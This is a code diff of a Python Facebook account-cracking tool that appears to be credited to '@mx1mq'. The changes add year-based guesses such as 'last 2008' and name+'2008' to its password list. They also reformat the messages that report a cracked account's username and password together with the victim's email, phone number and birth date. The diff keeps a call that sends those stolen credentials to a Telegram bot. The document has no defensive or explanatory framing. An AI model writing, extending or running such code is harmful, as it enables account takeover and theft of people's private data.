@@ -1166,6 +1166,7 @@ def passwrd():
 					pwv.append('last 2000')
 					pwv.append('last 2006')
 					pwv.append('last 1994')
+					pwv.append('last 2008')
 					pwv.append('last 2007')
 					pwv.append('last 1999')
 					pwv.append('last 1995')
@@ -1180,6 +1181,7 @@ def passwrd():
 					pwv.append(frs + '2000')
 					pwv.append(frs + '2006')
 					pwv.append(frs + '1994')
+					pwv.append(frs + '2008')
 					pwv.append(frs + '2007')
 					pwv.append(frs + '1999')
 					pwv.append(frs + '1995')
@@ -1286,7 +1288,7 @@ def passwrd():
 
 def crack(idf,pwv):
 	global loop,ok,cp
-	bi = random.choice([u,k,kk,b,h,hh])
+	bi = random.choice([a3,a4,a5,a6,a7,a10,a12,a14,u,k,kk,b,h,hh,a19,a20,a21,a22,a23,a24,a25,a26,a27,a36,a37,a40,xxh,])
 	pers = loop*100/len(id2)
 	fff = '%'
 	print('\r%s [𝙼𝙸𝙼𝙾 𝐕𝐈𝐏] %s/%s || [ 𝐎𝐊 ] - %s || [𝐶𝑃] - %s || %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
@@ -1331,7 +1333,8 @@ BY = @mx1mq |'''
 					print('\n')
 					statusok = f'''𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺✔️
 ⋘─────━𓆩𝙼𝙸𝙼𝙾𓆪‏━─────⋙
-❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
+❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
+❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
 
 ⋘─────━𓆩𝙼𝙸𝙼𝙾𓆪‏━─────⋙
 BY = @mx1mq'''
@@ -1372,7 +1375,7 @@ BY = @mx1mq'''
 
 					infoakun += f'''ميمو جابلك حساب صحيح تعال 
 ⋘─────━𓆩𝙼𝙸𝙼𝙾𓆪‏━─────⋙
-❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n<><><><><><><><><><><><><><>\n❖ - Jumlah Teman : {teman}\n❖ - Jumlah Pengikut : {pengikut}\n❖ - Email Aktif : {email}\n❖ - Nomor Aktif : {nomer}\n❖ - Tahun Akun : {tahun}\n❖ - Tanggal Lahir : {ttl}\n└──⌯ - Cokies: {kuki}\n
+❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n<><><><><><><><><><><><><><>\n❖ - Jumlah Teman : {teman}\n❖ - Jumlah Pengikut : {pengikut}\n❖ - Email Aktif : {email}\n❖ - Nomor Aktif : {nomer}\n❖ - Tahun Akun : {tahun}\n❖ - Tanggal Lahir : {ttl}\n
 ⋘─────━𓆩𝙼𝙸𝙼𝙾𓆪‏━─────⋙
 BY = @mx1mq '''
 					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(infoakun))
@@ -1472,4 +1475,3 @@ if __name__=='__main__':
 	except:pass
 	
 	Login()
-
